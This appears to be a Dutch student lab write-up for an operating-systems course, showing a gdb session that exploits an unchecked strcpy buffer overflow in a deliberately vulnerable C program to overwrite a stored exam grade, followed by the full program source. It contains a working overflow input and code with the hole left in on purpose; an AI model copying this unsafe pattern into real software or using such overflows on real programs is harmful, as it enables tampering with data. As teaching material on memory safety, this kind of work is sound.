\begin{enumerate}
  \item gcc -g -fno-stack-protector -z execstack -o examenresultaat examenresultaat.c
  \item gdb -q examenresultaat
  \item (gdb) list
  	\begin{enumerate}
  	\item Door dit commando uit te voeren krijgen we een overzicht van de programma code
  	\item We zoeken de scharnierpunten in dit programma:
  		\begin{enumerate}
  		\item 1 argument: \textless naam\textgreater
  		\item naam == Billy Eliot
  		\item punt == 5/20
  		\end{enumerate}
  	\end{enumerate}
  \item (gdb) break 41
  	\begin{enumerate}
  	\item adres van punt en naam te weten komen
  	\end{enumerate}
  \item (gdb) break 58
  	\begin{enumerate}
  	\item Mogelijke bufferoverflow als argument 1 te groot is
  	\item strcpy(naam, argv[1])
  	\end{enumerate}
  \item (gdb) break 60
  	\begin{enumerate}
  	\item Controleren of overflow gelukt is
  	\end{enumerate}
  \item (gdb) run "Billy Eliot"
  \item (gdb) x/x naam
  	\begin{enumerate}
  	\item adres: 0xbffff65a
  	\end{enumerate}
  \item (gdb) x/x punt
  	\begin{enumerate}
  	\item adres: 0xbffff66a
  	\end{enumerate}
  \item (gdb) print 0xbffff66a - 0xbffff65a
  	\begin{enumerate}
  	\item Berekenen hoeveel bytes er geschreven moeten worden om de variabele punt te overschrijven
  	\item \$1 = 16
  	\end{enumerate}
  \item (gdb) run \$(perl -e 'print "A"x17')
  	\begin{enumerate}
  	\item 17 keer A afprinten
  	\item De variabele punt zal nu overschreven worden met A
  	\end{enumerate}
  \item (gdb) cont
  \item (gdb) x/s punt
  	\begin{enumerate}
  	\item 0xbffff66a: "5/20"
  	\end{enumerate}
  \item (gdb) cont
  \item (gdb) x/s punt
  	\begin{enumerate}
  	\item 0xbffff66a: "A"
  	\end{enumerate}
  \item Gelukt!
  \item Volgens de opgave moet Billy Eliot \textgreater 10/20 behalen
  \item (gdb) quit
  \item ./examenresultaat ``\$(perl -e `print ``Billy Eliot'' . ``~~'' x5 . ``15/20'' ')''
\end{enumerate}

\begin{lstlisting}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <regex.h>

#define LENGTH 16

/* https://stackoverflow.com/questions/1085083/regular-expressions-in-c-examples 

int eigenstrcmp(char* str, char* naam) {
	int i, returnval = 0;
	for(i = 0; i < LENGTH; i++) {
		if(naam[i] == '\0') {
			break;
		} else if(str[i] != naam[i]) {
			returnval = 1;
			break;
		}
	}

	return returnval;
}

void padwithspaces(char* str) {
	char spaties[LENGTH];
	int stringlength = strlen(str);
	if(stringlength < LENGTH) {
		int aantalspaties = LENGTH - stringlength - 1;
			int i;

		for(i = 0; i < aantalspaties; i++)
			spaties[i] = ' ';
		spaties[aantalspaties] = '\0';
		strcat(str, spaties);
	}
}

int main(int argc, char *argv[]) {
		char punt[6] = "5/20";
		char naam[LENGTH];
		char correcte_naam[LENGTH] = "Billy Eliot";

		if(argc != 2) {
			printf("Hoe kan deze student nu een punt krijgen wanneer er geen naam wordt meegegeven?\n");
			exit(0);
		}
		regex_t regex1;
		regex_t regex2;
		if(regcomp(&regex1, "1[[:digit:]]/20", 0)) {
			fprintf(stderr, "Compile FAIL\n");
			exit(1);
		}
		if(regcomp(&regex2, "20/20", 0)) {
			fprintf(stderr, "Compile FAIL\n");
			exit(2);
		}

		strcpy(naam, argv[1]);
		padwithspaces(naam);
		padwithspaces(correcte_naam);

		if(!eigenstrcmp(naam, correcte_naam) && (!regexec(&regex1, punt, 0, NULL, 0) ||
			 !regexec(&regex2,punt, 0, NULL, 0))) {
			printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
			printf("Proficiat, Billy Eliot behaalde %s op Besturingssystemen 2!\n", punt);
			printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
		} else {
			printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
			printf("Pak uw spullen maar samen, u mag vertrekken!\n");
			printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
	}

	return 0;
}
\end{lstlisting}